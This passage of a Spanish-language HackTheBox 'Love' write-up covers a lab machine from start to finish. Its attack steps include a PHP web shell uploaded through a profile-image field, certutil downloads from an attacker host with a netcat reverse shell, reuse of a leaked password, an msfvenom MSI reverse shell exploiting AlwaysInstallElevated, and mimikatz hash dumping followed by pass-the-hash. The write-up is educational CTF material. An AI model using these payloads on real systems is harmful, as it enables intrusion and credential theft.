+<h3 id="rce-php-file">RCE mediante una subida aleatoria de archivos <a href="#rce-php-file">🔗</a></h3>
+
+<p>Jugando nos damos cuenta de que podemos agregar <strong>votantes</strong></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_admin_addvoters.png" alt="344page80_admin_addvoters" /></p>
+
+<p>Damos clic en <strong>New</strong> y vemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_admin_addvoters_form.png" alt="344page80_admin_addvoters_form" /></p>
+
+<p>Podemos añadir una imagen de perfil 😏 pues en vez de una imagen, intentemos subir un archivo <code>.php</code> con código que nos permita ejecutar comandos en el sistema:</p>
+
+<pre><code class="language-bash">❱ cat quesedice.php 
+&lt;?php $command=shell_exec($_GET['xmd']); echo $command; ?&gt;
+</code></pre>
+
+<p>Lo que reciba la variable <code>xmd</code> a través del método <a href="https://www.ionos.es/digitalguide/paginas-web/desarrollo-web/get-vs-post/"><strong>GET</strong></a>, será ejecutado en el sistema (gracias a la función <code>shell_exec()</code>, pero podríamos usar <code>system()</code>, <code>exec()</code> y otras más), el resultado de la ejecución se guarda en la variable <code>command</code> y mostrado en pantalla con ayuda de <code>echo</code>. Por ejemplo, si somos el usuario <strong>web</strong> y hacemos <code>xmd=whoami</code>, se ejecutara <code>whoami</code> en el sistema y guardara <strong>web</strong> en la variable <code>command</code>, lo siguiente será ver ese resultado con el <code>echo $command</code>.</p>
+
+<p>Nuestro formulario quedaría así (en mi caso):</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_admin_addvoters_form.png" alt="344page80_admin_addvoters_form_done" /></p>
+
+<p>Guardamos y:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_admin_addvoters_lanz.png" alt="344page80_admin_addvoters_lanz" /></p>
+
+<p>Vemos el icono de la imagen en todo el centro, la arrastramos (como si quisiéramos abrirla en otra ventana) y nos redirige a la URL <code>http://10.10.10.239/images/quesedice.php</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_images_quesedicePHP.png" alt="344page80_images_quesedicePHP" /></p>
+
+<p>Al parecer esta interpretando el código, solo que <code>shell_exec</code> esta vacío y nos muestra ese error, juguemos con el método <strong>GET</strong> para ejecutar el comando <code>whoami</code>:</p>
+
+<pre><code class="language-html">http://10.10.10.239/images/quesedice.php?xmd=whoami
+</code></pre>
+
+<p>Obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_images_quesedicePHP_whoami.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Opa, tenemos ejecución remota de comandos (: El usuario que esta ejecutando el servidor web se llama <code>phoebe</code>, por lo tanto vamos a estar ejecutando comandos como ese usuario (:</p>
+
+<p><strong>Ya confirmamos <em>RCE</em>, ahora entablémonos una Reverse Shell:</strong></p>
+
+<p>Podemos descargar el binario <code>nc.exe</code> desde <a href="https://eternallybored.org/misc/netcat/">acá</a> (netcat 1.12), una vez los tengamos en nuestro sistema, los movemos o nos movemos donde estén los binarios y levantamos un servidor web con ayuda de <strong>Python</strong>:</p>
+
+<pre><code class="language-bash">❱ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+
+<p>Ahora procedemos a indicarle a la máquina que se descargue el binario <code>nc.exe</code> y lo guarde en su sistema:</p>
+
+<pre><code class="language-html">http://10.10.10.239/images/quesedice.php?xmd=certutil.exe -f -split -urlcache http://10.10.14.103:8000/nc.exe c:\\Users\\phoebe\\Videos\\nc.exe
+</code></pre>
+
+<p>Guardamos el binario en la carpeta <strong>Videos</strong> del usuario <strong>phoebe</strong>… La web nos responde:</p>
+
+<pre><code class="language-html">**** Online **** 0000 ... 96d8 CertUtil: -URLCache command completed successfully. 
+</code></pre>
+
+<p>Validamos que se haya descargado y exista en el sistema:</p>
+
+<pre><code class="language-html">http://10.10.10.239/images/quesedice.php?xmd=dir c:\Users\phoebe\Videos\nc.exe
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_images_quesedicePHP_dir_videos.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Listones, ahora simplemente le indicamos que una vez entable una conexión con el puerto <strong>4433</strong> de nuestra máquina nos lance por ahí una <code>cmd.exe</code> (una terminal de <strong>Windows</strong>).</p>
+
+<p><strong>Pero claro, antes tenemos que ponernos en escucha por el puerto **4433</strong>:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+listening on [any] 4433 ...
+</code></pre>
+
+<p>Ahora sí, procedamos:</p>
+
+<pre><code class="language-html">http://10.10.10.239/images/quesedice.php?xmd=c:\Users\phoebe\Videos\nc.exe 10.10.14.103 4433 -e cmd.exe
+</code></pre>
+
+<p>YyyyyYyaysdfyyayyYYYYyy:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_nc_phoebe_RevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344google_gif_yeahslowgolf.gif" style="display: block; margin-left: auto; margin-right: auto; width: 70%;" /></p>
+
+<p>Peeeeeeeeerfecto, tamos con una terminal en el sistema como el usuario <strong>phoebe</strong>.</p>
+
+<p>…</p>
+
+<p>He creado un script para facilitar la ejecución remota de comandos, solo debemos pasarle el <strong>comando</strong> y no debemos preocuparnos de nada más (:</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/love/arbitrary_up_RCE.py">arbitrary_up_RCE.py</a>.</p>
+</blockquote>
+
+<p>…</p>
+
+<h3 id="phoebe-evilrm">Obtención PowerShell estable con evil-winrm <a href="#phoebe-evilrm">🔗</a></h3>
+
+<p>Enumerando el sistema y la raíz del servidor web, encontramos el archivo que hace la conexión con la base de datos:</p>
+
+<pre><code class="language-powershell">c:\\xampp\htdocs\omrs\includes&gt;type conn.php
+</code></pre>
+
+<pre><code class="language-php">&lt;?php
+        $conn = new mysqli('localhost', 'phoebe', 'HTB#9826^(_', 'votesystem');
+
+        if ($conn-&gt;connect_error) {
+            die("Connection failed: " . $conn-&gt;connect_error);
+        }
+
+?&gt;
+</code></pre>
+
+<p>Tenemos al usuario <strong>phoebe</strong> y su contraseña contra el servicio <strong>MySQL</strong>…</p>
+
+<p>Pero haciendo reutilización de contraseñas y jugando con la herramienta <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> logramos obtener una <strong>PowerShell</strong> como el usuario <strong>Phoebe</strong> en el sistema:</p>
+
+<pre><code class="language-bash">❱ evil-winrm -i 10.10.10.239 -u 'phoebe' -p 'HTB#9826^(_'
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_evilwinrm_phoebe.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Así que ya podemos salirnos de la <strong>Reverse Shell</strong> (:</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Enumerando el sistema por encima buscando formas de escalar no encontramos nada interesante, o bueno, encontramos una carpeta algo “llamativa” en la raíz del sistema:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\&gt; dir
+
+    Directory: C:\
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         4/21/2021   9:52 AM                Administration
+...
+</code></pre>
+
+<p>Dentro hay unos objetos, pero nada que sacar de ellos, así que tamos igual…</p>
+
+<p>De ahí me fui para la web y busqué algunas guías sobre <strong>PrivEsc Windows</strong>, llegamos a esta de <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation">HackTricks</a>, allí encontramos una manera de escalar llamada <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated">AlwaysInstallElevated</a>, en la cual debemos validar si dos <a href="https://es.wikipedia.org/wiki/Registro_de_Windows">registros del sistema</a> están habilitados (que tengan el valor <code>0x1</code>), en caso de que lo estén tendremos la posibilidad de instalar <a href="https://es.wikipedia.org/wiki/Windows_Installer">Microsoft Windows Installer Package Files (MSI)</a> (paquetes <strong>MSI</strong>) con permisos administrativos así no los tengamos (: pues validemos los dos registros:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+</code></pre>
+
+<p>Bien, siguiente:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+</code></pre>
+
+<p>Perfecto, entonces tenemos la posibilidad de instalar paquetes <strong>MSI</strong> con permisos administrativos, apoyémonos de <strong>msfvenom</strong> para crear un paquete malicioso que cuando intente <strong>instalarlo</strong> nos genere una Reverse Shell:</p>
+
+<blockquote>
+  <p><a href="https://cd6629.gitbook.io/ctfwriteups/windows-privesc#alwaysinstallelevated">cd6629.gitbook.io - windows privesc - AlwaysInstallElevated</a>.</p>
+</blockquote>
+
+<p><strong>Asignamos nuestra IP y el puerto en el que estaremos escuchando…</strong></p>
+
+<pre><code class="language-bash">❱ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.103 LPORT=4433 -f msi -o ajaterompi.msi
+</code></pre>
+
+<p>Ejecutamos y obtenemos el paquete:</p>
+
+<pre><code class="language-bash">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 324 bytes
+Final size of msi file: 159744 bytes
+Saved as: ajaterompi.msi
+</code></pre>
+
+<p>Ahora, subimos el paquete a la máquina víctima y procedemos a instalarlo:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Phoebe\Videos&gt; certutil.exe -f -urlcache -split http://10.10.14.103:8000/ajaterompi.msi c:\Users\Phoebe\Videos\ajaterompi.msi
+</code></pre>
+
+<blockquote>
+  <p><strong>Nos ponemos en escucha por el puerto 4433: <code>nc -lvp 4433</code></strong></p>
+</blockquote>
+
+<p>Ahora ejecutamos:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Phoebe\Videos&gt; msiexec /quiet /qn /i c:\Users\Phoebe\Videos\ajaterompi.msi
+</code></pre>
+
+<p>Donde (gracias a <a href="https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-windows#alwaysinstallelevated-setting">vulp3cula.gitbook.io - privesc windows - AlwaysInstallElevated setting</a>):</p>
+
+<ul>
+  <li><code>/quiet</code> permite <strong>bypassear</strong> el <strong>control de cuentas de usuario (<a href="https://java.com/es/download/help/uac.html">UAC</a>)</strong>.</li>
+  <li><code>/qn</code> le indica al programa que no nos ejecute una interfaz gráfica.</li>
+  <li><code>/i</code> es el que le dice que queremos hacer una <strong>instalación</strong> de un paquete.</li>
+</ul>
+
+<p>Listo, entendiendo que estamos haciendo, procedemos a ejecutar la línea…</p>
+
+<p>Pero no pasa nada ): Acá se me ocurrió que el problema podría ser <strong>PowerShell</strong>, así que volviendo a usar él <a href="">script</a> para ejecutar comandos en el sistema, le decimos que nos ejecute esa línea:</p>
+
+<pre><code class="language-bash">❱ python3 arbitrary_up_RCE.py -c 'msiexec /quiet /qn /i c:\Users\Phoebe\Videos\ajaterompi.msi'
+</code></pre>
+
+<p>Y en nuestro listener:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_script_msiexec_adminSH.png" alt="344bash_script_msiexec_adminSH" /></p>
+
+<p>Obtenemos la <strong>Reverse Shell</strong> como el usuario administrador del sistema (:</p>
+
+<p>Recopilamos lo usado:</p>
+
+<ul>
+  <li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated">HackTricks - AlwaysInstallElevated</a>.</li>
+  <li><a href="https://cd6629.gitbook.io/ctfwriteups/windows-privesc#alwaysinstallelevated">cd6629.gitbook.io - windows privesc - AlwaysInstallElevated</a>.</li>
+  <li><a href="https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-windows#alwaysinstallelevated-setting">vulp3cula.gitbook.io - privesc windows - AlwaysInstallElevated setting</a>.</li>
+</ul>
+
+<p>Veamos las flags…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344flags.png" alt="344flags" /></p>
+
+<p>Y listones, hemos terminado la máquina, linda, lindo camino.</p>
+
+<p>…</p>
+
+<p>He creado un script <strong>autopwn</strong>:</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/love/autopwnLove.py">AutopwnLove.py</a>.</p>
+</blockquote>
+
+<p>El cual efectúa la explotación e instalación del paquete <code>.msi</code> para generarnos una Shell en el propio script, el script levantara un servidor web por 10 segundos el cual usaremos para subir el paquete a la máquina (que si no le especificas uno el programa lo crea):</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_autopwn_done.png" alt="344bash_autopwn_done" /></p>
+
+<hr />
+
+<h2 id="post-privesc-ntlm-hashes">Post Explotación: Extracción hashes NTLM <a href="#post-privesc-ntlm-hashes">#</a></h2>
+
+<p>Algo que podemos hacer es jugar con <a href="https://github.com/gentilkiwi/mimikatz/wiki">mimikatz</a> (herramienta que entre muchas cosas nos ayuda a robar datos de identificación de usuarios) para extraer los hashes <a href="https://www.ionos.es/digitalguide/servidores/know-how/ntlm/"><strong>NTLM</strong></a> para hacer el famoso ataque <strong>PassTheHash</strong>:</p>
+
+<blockquote>
+  <p>Este ataque consiste en capturar las passwords que se encuentran almacenadas en la memoria RAM. En realidad, no se capturan las passwords como tal, sino que se captura el hash de cada password. <a href="https://zybersec.es/que-es-mimikatz-y-por-que-nos-tenemos-que-preocupar-si-lo-detectamos-en-nuestra-red">Qué es Mimikatz?</a>.</p>
+</blockquote>
+
+<blockquote>
+  <p>Si una persona captura el hash de la password, puede hacer exactamente lo mismo que si tuviera la password original.</p>
+</blockquote>
+
+<p>Perfectisimo, pues subamos <strong>mimikatz</strong> a la máquina víctima, lo podemos descargar del propio <a href="https://github.com/gentilkiwi/mimikatz">repositorio</a> en la parte <a href="https://github.com/gentilkiwi/mimikatz/releases"><strong>Releases</strong></a>…</p>
+
+<p>Una vez tengamos el binario <code>mimikatz.exe</code>, lo subimos y ejecutamos:</p>
+
+<pre><code class="language-powershell">c:\Users\Administrator\Videos&gt;mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 31 2021 00:08:47
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # 
+</code></pre>
+
+<p>Ahora, si queremos intentar ver las contraseñas en texto plano (o al menos los hashes <strong>NTLM</strong>) escribimos:</p>
+
+<pre><code class="language-powershell">mimikatz # sekurlsa::logonpasswords
+</code></pre>
+
+<p>Nos respondería con info de los usuarios, en este caso de <strong>Phoebe</strong> y <strong>Administrator</strong>:</p>
+
+<p><strong>Phoebe:</strong></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_win_mimi_lsa_phoebe.png" alt="344bash_win_mimi_lsa_phoebe" /></p>
+
+<p><strong>Administrator:</strong></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_win_mimi_lsa_admin.png" alt="344bash_win_mimi_lsa_admin" /></p>
+
+<p>Vemos los hashes <strong>NTLM</strong> pero no las contraseñas en texto plano, aunque nos da igual, ya que podemos hacer mucho con simplemente los hashes, como por ejemplo entablarnos una <strong>PowerShell</strong> con ayuda de <strong>evil-winrm</strong> o <strong>psexec.py</strong> como cualquiera de los dos usuarios:</p>
+
+<h3 id="post-privesc-pth-winrm">Pass-The-Hash - evil-winrm <a href="#post-privesc-pth-winrm">🔗</a></h3>
+
+<p>Por ejemplo para el usuario <strong>Phoebe</strong> tomaríamos su hash y escribiríamos:</p>
+
+<pre><code class="language-bash">❱ evil-winrm -i 10.10.10.239 -u 'phoebe' -H a9ccd3a011ceb45b44ce6f6b40122268
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_evilwinrm_pth_phoebe.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Y haríamos lo mismo con el usuario <strong>Administrator</strong> (con el que realmente no nos sabemos su contraseña):</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_evilwinrm_pth_admin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>😜 🥴 😵</p>
+
+<h3 id="post-privesc-pth-psexec">Pass-The-Hash - psexec.py <a href="#post-privesc-pth-psexec">🔗</a></h3>
+
+<p>Es igual de sencillo, solo que esta vez nos lo permitió solo con el usuario <strong>Administrator</strong>:</p>
+
+<p><strong>Phoebe</strong>:</p>
+
+<pre><code class="language-bash">❱ psexec.py -hashes :a9ccd3a011ceb45b44ce6f6b40122268 Phoebe@10.10.10.239
+Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.239.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+</code></pre>
+
+<p><strong>Administrator</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_psexec_pth_admin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>…</p>
+
+<p>Y así conseguiríamos una Shell sin necesidad de contraseñas e incluso sin necesidad de explotación alguna, simplemente con el hash <strong>NTLM</strong> identificador del usuario (:</p>
+
+<p>Podemos hacer más cositas guapas con <strong>mimikatz</strong>, pero eso ya se los dejo de investigación :P</p>
+
+<p>…</p>
+
+<p>No me llamo tanto la atención el encontrar la contraseña de <strong>Phoebe</strong> en una página web así de la nada, pero de resto estuvo lindo el camino.</p>
+
+<p>Y una vez más están volviendo a poner máquinas que si son sencillitas, esas que incentivan a la gente y no les hace explotar la cabeza tan deprisa jajaj, así que gracias <strong>HTB</strong>.</p>
+
+<p>La escalada no la había hecho y me pareció interesante, no sé que tan frecuente se ve eso en realidad, pero bueno, existe…</p>
+
+<p>Bueno, nos leeremos después, a seguir disfrutando de la vida y a seguir rompiendo todo!! Bless &lt;3</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Love&url=http://localhost:4000/htb/love" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#AlwaysInstallElevated">AlwaysInstallElevated</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#MSI">MSI</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SSRF">SSRF</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#file-upload">file-upload</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#registers">registers</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/thenotebook">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png" alt="HackTheBox - TheNotebook"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/thenotebook">HackTheBox - TheNotebook</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos el mundo de los JSON Web Tokens para ingresar a una web con permisos administrativos. Jugaremos con llaves SSH y romperemos el siempre fiel Docker...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">31 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/help">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170banner.png" alt="HackTheBox - Help"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/help">HackTheBox - Help</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil. Investigaremos subidas de archivos .php en el servicio HelpDeskZ, jueguitos sucios con MySQL y una explotación de un kernel con ganas de morir.
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">22 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/breadcrumbs">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316banner.png" alt="HackTheBox - Breadcrumbs"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/breadcrumbs">HackTheBox - Breadcrumbs</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel difícil. Jugaremos mucho con inyecciones y robos :P Encontraremos un LFI, haremos cookie-hijacking, leeremos contraseñas almacenadas, jugando con binarios encontramos una URL que nos llevara de la...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">17 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
